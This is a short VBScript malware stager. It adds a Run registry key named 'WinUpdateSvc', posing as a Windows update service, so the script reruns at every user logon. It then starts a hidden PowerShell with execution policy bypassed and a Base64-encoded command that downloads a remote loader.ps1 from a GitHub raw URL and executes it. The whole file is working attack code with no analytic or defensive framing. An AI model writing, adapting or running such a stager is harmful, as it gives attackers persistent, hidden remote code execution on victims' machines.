' stager.vbs
Set sh = CreateObject("WScript.Shell")
' Build the command line to re-invoke this same script invisibly:
scriptPath = WScript.ScriptFullName
runCmd     = "wscript.exe """ & scriptPath & """"

' Write into HKCU\...\Run so it fires on each user logon:
sh.RegWrite _
  "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WinUpdateSvc", _
  runCmd, _
  "REG_SZ"

' 0 = hide the window, False = don’t wait for completion
sh.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AYwBvAG4AYwBlAG4AdAByAGEAdABlAGQAcwB1AGwAZgB1AHIAaQBjAGEAYwBpAGQALwB2AGUAYwB0AG8AcgAvAHIAZQBmAHMALwBoAGUAYQBkAHMALwBtAGEAaQBuAC8AbABvAGEAZABlAHIALgBwAHMAMQAnACkA", 0, False